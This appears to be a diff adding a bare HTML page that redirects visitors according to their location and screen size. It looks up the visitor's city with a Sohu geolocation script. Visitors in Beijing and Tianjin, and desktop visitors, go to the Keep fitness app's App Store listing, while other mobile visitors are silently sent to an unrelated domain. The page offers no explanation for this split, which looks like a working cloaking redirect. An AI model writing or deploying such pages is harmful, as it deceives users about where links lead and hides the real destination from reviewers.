@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Document</title>
+</head>
+<body onload="ScreenWidth()">
+	<script src="http://pv.sohu.com/cityjson?ie=utf-8"></script>
+	<script language="JavaScript">
+	function ScreenWidth(){
+		var city = returnCitySN.cname;
+		if( (city.indexOf('北京市') >= 0) || (city.indexOf('天津市') >= 0) ){
+			window.location.href = 'https://itunes.apple.com/us/app/keep-%E7%A7%BB%E5%8A%A8%E5%81%A5%E8%BA%AB%E6%95%99%E7%BB%83-%E8%87%AA%E7%94%B1%E8%BF%90%E5%8A%A8%E5%9C%BA/id952694580?mt=8';
+		}else{
+			if (screen.width <= 768){
+			    window.location.href = 'http://top.huashunglass.com/zzh/sq/index.html';
+			}else {
+			    window.location.href = 'https://itunes.apple.com/us/app/keep-%E7%A7%BB%E5%8A%A8%E5%81%A5%E8%BA%AB%E6%95%99%E7%BB%83-%E8%87%AA%E7%94%B1%E8%BF%90%E5%8A%A8%E5%9C%BA/id952694580?mt=8';
+			}
+		}
+		
+	}
+	</script>
+</body>
+</html>
